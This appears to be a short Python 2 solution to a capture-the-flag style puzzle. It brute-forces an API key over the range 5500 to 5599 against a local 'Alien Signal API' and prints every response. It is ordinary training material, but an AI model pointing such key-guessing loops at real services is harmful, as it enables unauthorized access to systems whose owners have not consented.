#
# Alien Signal API listening on http://127.0.0.1:8082
# Use HTTP GET with x-api-key header to get signal
# We have narrowed down the key to be in the range of 5500 to 5600
# Note: The script can timeout if this occurs try narrowing
# down your search
#

import urllib2
for x in range (5500,5600):
  header = {'x-api-key': str(x)}
  req = urllib2.Request('http://127.0.0.1:8082', None, header)
  resp = urllib2.urlopen(req)
  data = resp.read()
  print(data)
